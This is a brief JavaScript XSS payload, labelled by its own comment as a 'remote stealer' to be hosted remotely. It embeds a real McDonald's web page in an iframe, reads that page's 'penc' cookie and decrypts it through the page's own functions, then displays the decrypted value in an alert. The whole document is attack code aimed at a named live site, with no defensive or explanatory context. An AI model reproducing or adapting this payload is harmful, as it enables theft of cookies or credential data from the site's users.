#remote stealer to load into your remote hosting space

if (!window.xssIsExecuted) {
    window.xssIsExecuted = true;

    var iframe = $('<iframe src="https://www.mcdonalds.com/us/en-us.html"></iframe>');
    $('body').append(iframe);

    iframe.on('load', function() {
        var penc = iframe[0].contentWindow.getCookie('penc');
        alert(iframe[0].contentWindow.decrypt(penc));
    });
}
